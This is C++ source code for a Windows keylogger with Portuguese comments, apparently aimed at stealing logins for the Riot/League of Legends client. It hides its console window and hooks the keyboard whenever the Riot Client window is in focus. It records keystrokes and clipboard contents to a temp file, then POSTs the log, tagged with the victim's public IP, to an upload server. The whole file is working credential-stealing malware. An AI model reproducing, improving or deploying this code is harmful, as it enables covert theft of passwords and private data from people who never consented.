#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <curl/curl.h>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <nlohmann/json.hpp>
#include <algorithm>


using json = nlohmann::json;


std::string GetClipboardText();
bool inForeground(wchar_t* clientProcess);
bool createMutext(const wchar_t* mutexName);
LRESULT CALLBACK KeyLogProc(int nCode, WPARAM wParam, LPARAM lParam);
std::string readLog();
bool uploadTXT(const std::string& url);
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output);
std::string getIP();

std::ofstream outputFile;

int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    wchar_t processTitle[] = L"Riot Client Main";
    std::string ipAddress = getIP();
    const char* endpoint = "http://127.0.0.1:5000/upload/";
    std::string fullUrl = endpoint + ipAddress;

    const char* url = fullUrl.c_str();


    createMutext(L"MyL0ggerF0rL0L");

    while (true) {
        if (!inForeground(processTitle)) {
            Sleep(1000);
        }
        else {
            HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogProc, NULL, 0);

            MSG msg;
            while (true) {
                if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);

                    // Verifique se o processo ainda está em primeiro plano
                    if (!inForeground(processTitle)) {
                        uploadTXT(url);
                        break;// Saia do loop interno se o processo não estiver mais em primeiro plano
                    }
                }
                else {
                    Sleep(10);

                    // Verifique novamente se o processo está em primeiro plano
                    if (!inForeground(processTitle)) {
                        uploadTXT(url);
                        break;// Saia do loop interno se o processo não estiver mais em primeiro plano
                    }
                }
            }
            UnhookWindowsHookEx(hHook);
        }
    }
    return 0;
}

std::string readLog() {
    char pathTMP[MAX_PATH];
    GetTempPathA(MAX_PATH, pathTMP);
    std::string logFilePath = std::string(pathTMP) + "\\logs.txt";
    std::ifstream logFile(logFilePath);
    std::stringstream buffer;

    buffer << logFile.rdbuf();

    return buffer.str();
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t total_size = size * nmemb;
    output->append((char*)contents, total_size);
    return total_size;
}

std::string getIP() {
    CURL* curl;
    CURLcode res{};

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        const char* url = "https://api.ipify.org?format=json";

        // Configura a requisição GET
        curl_easy_setopt(curl, CURLOPT_URL, url);

        // Configura a função de callback para receber a resposta da API
        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            try {
                json jsonResponse = json::parse(response);
                std::string ip = jsonResponse["ip"];
                curl_easy_cleanup(curl);
                std::replace(ip.begin(), ip.end(), '.', '-');

                return ip;
            }
            catch (const std::exception) {
                curl_easy_cleanup(curl);
            }
        }

    }return "annonymous";
}

bool uploadTXT(const std::string& url) {
    CURL* curl;
    CURLcode res;

    // Inicializa o cURL
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        std::string contentLog = readLog();

        // Define a URL para a requisição POST
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, contentLog.c_str());

        res = curl_easy_perform(curl);

        // Verifica se ocorreu algum erro
        if (res != CURLE_OK)
            return false;

        curl_easy_cleanup(curl);
        curl_global_cleanup();
    }
    return true;
}

LRESULT CALLBACK KeyLogProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static bool ctrlPressed = false;
    std::string content;
    char pathTMP[MAX_PATH];
    GetTempPathA(MAX_PATH, pathTMP);

    std::string logFilePath = std::string(pathTMP) + "\\logs.txt";

    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
            outputFile.open(logFilePath, std::ios::app);

            if (outputFile.is_open()) {
                if (pKey->vkCode == VK_RETURN) {
                    outputFile << std::endl;
                }
                else if (pKey->vkCode == VK_BACK) {
                    outputFile << " [ BACKSPACE ] ";
                }
                else if (pKey->vkCode == 'C' && GetAsyncKeyState(VK_CONTROL) & 0x8000) {
                    content = GetClipboardText();
                    outputFile << " [ Ctrl+C ] -> " << content << " <- ";

                }
                else if (pKey->vkCode == 'V' && GetAsyncKeyState(VK_CONTROL) & 0x8000) {
                    content = GetClipboardText();
                    outputFile << " [ Ctrl+V ] -> " << content << " <- ";
                }
                else if (pKey->vkCode == VK_TAB) {
                    outputFile << " [ TAB ]\n";
                }
                else if (pKey->vkCode == VK_SPACE) {
                    outputFile << " ";
                }
                else if (pKey->vkCode == VK_UP || pKey->vkCode == VK_DOWN || pKey->vkCode == VK_LEFT || pKey->vkCode == VK_RIGHT) {
                    outputFile << " [ SETA " << pKey->vkCode << " ] ";
                }
                else if (pKey->vkCode == VK_CONTROL || pKey->vkCode == VK_MENU || pKey->vkCode == VK_SHIFT) {
                    outputFile << " [ " << (char)pKey->vkCode << " ] ";
                }
                else if (pKey->vkCode == VK_INSERT || pKey->vkCode == VK_DELETE || pKey->vkCode == VK_HOME || pKey->vkCode == VK_END || pKey->vkCode == VK_PRIOR || pKey->vkCode == VK_NEXT) {
                    outputFile << " [ " << (char)pKey->vkCode << " ] ";
                }
                else {
                    outputFile << char(pKey->vkCode);
                }

                outputFile.close();
            }
        }
        else if (wParam == WM_KEYUP && GetAsyncKeyState(VK_CONTROL) & 0x8000) {
            ctrlPressed = false;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

std::string GetClipboardText() {
    std::string clipboardText;

    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);

        if (hData != NULL) {
            char* text = static_cast<char*>(GlobalLock(hData));
            if (text != NULL) {
                clipboardText = text;
                GlobalUnlock(hData);
            }

            CloseClipboard();
        }
    }
    return clipboardText;
}

bool inForeground(wchar_t* clientProcess) {
    HWND foregroundWindows = GetForegroundWindow();
    wchar_t foregroundTitle[256];
    wchar_t* ptr;

    GetWindowTextW(foregroundWindows, foregroundTitle, _countof(foregroundTitle));

    ptr = wcsstr(foregroundTitle, clientProcess);

    if (ptr != NULL) {
        // Client in foreground
        return true;
    }
    // Client not in foreground
    return false;
}

bool createMutext(const wchar_t* mutexName) {
    HANDLE hMutex = CreateMutex(NULL, true, mutexName);

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);

        exit(0);
    }
    return true;
}
